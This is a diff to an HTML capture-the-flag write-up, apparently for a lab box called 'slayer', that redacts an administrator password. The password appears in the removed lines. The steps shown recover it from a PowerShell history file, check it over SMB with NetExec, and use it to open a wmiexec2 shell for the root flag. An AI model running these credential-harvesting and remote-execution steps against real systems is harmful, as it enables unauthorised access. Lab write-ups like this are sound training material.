@@ -323,15 +323,11 @@ $ cat host_file
 C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 PS C:\> type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-net user administrator "ebz0yxy3txh9BDE*yeh"</code></pre>
-
-  <div class="key-finding">
-    <strong>Administrator password discovered:</strong> <code>ebz0yxy3txh9BDE*yeh</code>
-  </div>
+net user administrator "[REDACTED]"</code></pre>
 
   <h3><span class="step">[Step 7]</span> Validating Administrator Credentials</h3>
   <p>I verified the credentials work using NetExec:</p>
-  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p 'ebz0yxy3txh9BDE*yeh'</code></pre>
+  <pre><code>$ nxc smb 10.1.140.139 -u administrator -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/slayer/admin-creds-validated.png" alt="Administrator credentials validated via SMB" loading="lazy"></p>
 
@@ -356,7 +352,7 @@ $ pip install setuptools</code></pre>
 
   <p><strong>Getting the root flag:</strong></p>
   <pre><code>$ ./wmiexec2.py EC2AMAZ-M1LFCNO/administrator@10.1.140.139
-Password: [ebz0yxy3txh9BDE*yeh]
+Password: [[REDACTED]]
 [*] SMBv3.0 dialect used
 [*] Launching wmiexec2
 [*] Press help for extra shell commands
